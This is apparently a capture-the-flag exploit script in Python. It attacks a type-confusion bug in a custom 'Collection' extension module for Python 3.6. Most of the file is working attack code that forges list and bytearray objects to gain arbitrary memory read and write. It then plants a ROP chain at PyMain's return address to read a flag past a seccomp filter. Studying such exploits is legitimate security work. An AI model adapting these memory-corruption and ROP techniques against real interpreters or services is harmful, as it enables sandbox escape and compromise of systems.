###############################################################################
#### Helper functions                                                      ####
###############################################################################
def p64(x): 
    result = b'' 
    for i in range(8): 
        result += bytes ([ x  &  0xff ]) 
        x >>= 8
    return result


def u64(s): 
    result = 0 
    for i in range(8): 
        result += s[i] << (8 * i) 
    return result

# Stolen from https://xz.aliyun.com/t/3747
subs = [].__class__.mro()[1].__subclasses__()
for cls in subs:
    if cls.__name__ == 'bytearray':
        bytearray = cls

    if cls.__name__ == 'list':
        list = cls

    if cls.__name__ == 'bytes':
        bytes = cls



###############################################################################
#### Read && Write primitive                                               ####
###############################################################################
# Build read and write primitive by abusing type confusion bug in Collection  #
# module. Create fake_list in order to setup barr in such way, that barr      #
# can write over read_write_barr struct fields. This way we can setup         #
# read_write_barr anytime we want to write/read from an address by setting    #
# ob_bytes and ob_start fields to this address.                               #
#                                                                             #
# This is how a memory layout should look like.                               #
#                                                                             #
#                                                                             #
#         fake_list:                                                          #
# [ref_cnt     ][PyBytes_Type]                                                #
# [len         ][hash(-1)    ]                                                #
# [fl ref_cnt  ][PyList_Type ]                                                #
# [fl len      ][fl items    ] --\                                            #
#                                |                                            #
#                                |                                            #
#                                v                                            #
#                               barr:                                         #
#                        [ref_cnt     ][PyByteArray_Type]                     #
#                        [len         ][ob_alloc        ]                     #
#                        [ob_bytes    ][ob_start        ] --\                 #
#                                                           |                 #
#                                                           |                 #
#                                                           v                 #
#                                                      read_write_barr        #
#                                                                             #
#                                                                             #
###############################################################################

def arbitrary_write(dst, src, sz):
    # Setup read_write_barr header
    barr[0:8] = p64(0x10) # ref_cnt
    barr[8:16] = p64(id(bytearray)) # type
    barr[16:24] = p64(0x10000) # len
    barr[24:32] = p64(0x10001) # ob_alloc
    barr[32:40] = p64(dst)
    barr[40:48] = p64(dst)

    for i in range(sz):
        read_write_barr[i] = src[i]


def arbitrary_read(src, dst, sz):
    # Setup read_write_barr header
    barr[0:8] = p64(0x10) # ref_cnt
    barr[8:16] = p64(id(bytearray)) # type
    barr[16:24] = p64(0x10000) # len
    barr[24:32] = p64(0x10001) # ob_alloc
    barr[32:40] = p64(src)
    barr[40:48] = p64(src)

    for i in range(sz):
        dst[i] = read_write_barr[i]   



barr = bytearray(256)
print(f"[D] barr: {hex(id(barr))}")

fake_list = p64(0x10) + p64(id(list)) + p64(256) + p64(id(barr) + 0x20) + p64(id(barr))
print(f"[D] fake_list: {hex(id(fake_list))}")

# Create type confusion
c1 = Collection.Collection({'p0': [1], 'p1': 1})
c2 = Collection.Collection({'p1': id(fake_list) + 0x20, 'p0': [2]})

read_write_barr = bytearray(256)
print(f"[D] read_write_barr: {hex(id(read_write_barr))}")

c2.get('p0')[0] = read_write_barr # setup barr->ob_bytes
c2.get('p0')[1] = read_write_barr # setup barr->ob_start




###############################################################################
#### ROP                                                                   ####
###############################################################################
# With arbitrary read & write we are ready to retrieve the flag. The seccommp
# policy allows: readv and write, and so we will use readv to read flag 
# content from 1023 descriptor and write to display it.
# /usr/bin/python3.6 is not a PIE and so we know the location of rop gadgets.
# Moreover we place our ROP at return from PyMain. To get the address where
# this return address is stored at stack we read the pointer value of environ
# variable. This variable has known address as again /usr/bin/python3.6 is
# not a PIE. Then we just get a constant offset between PyMain return address
# and this environ pointer value.
###############################################################################
ENVIRON_PYMAIN_RET_OFST = 0x150
ENVIRON_ADDR = 0xa509a0 
POP_RDI_GADGET = 0x0000000000421872 # pop rdi; ret
POP_RSI_GADGET = 0x000000000042159a # pop rsi; ret
POP_RDX_GADGET = 0x00000000004026c1 # pop rdx; ret
READV_PLT = 0x420950
WRITE_PLT = 0x420880

mem = b'\x41' * 256 # allocate mem where we will read flag to
print(f"[D] mem: {hex(id(mem))}")

iov = p64(id(mem) + 0x20) + p64(256)
print(f"[D] iov: {hex(id(iov))}")

# readv(1023, iov, 1)
rop = p64(POP_RDI_GADGET) + p64(1023)
rop += p64(POP_RSI_GADGET) + p64(id(iov) + 0x20) # TODO 
rop += p64(POP_RDX_GADGET) + p64(1)
rop += p64(READV_PLT)
# write(1, iov[0].iov_base, 32)
rop += p64(POP_RDI_GADGET) + p64(1)
rop += p64(POP_RSI_GADGET) + p64(id(mem) + 0x20)
rop += p64(POP_RDX_GADGET) + p64(32)
rop += p64(WRITE_PLT)

# Read env variable. The offset between environment variable and ret address 
# from PyMain should stay constant.
buf = bytearray(256)
arbitrary_read(ENVIRON_ADDR, buf, 8)
environ_addr = u64(buf[:8])
print(f"[+] environ: {hex(environ_addr)}")

rop_start_addr = environ_addr - ENVIRON_PYMAIN_RET_OFST
print(f"[D] Placing rop at: {hex(rop_start_addr)}")
arbitrary_write(rop_start_addr, rop, len(rop))


# To ease debugging ues custom signal. Not needed in real exploit. 
print("[i] Exiting and freeing all allocated objects")

END_OF_PWN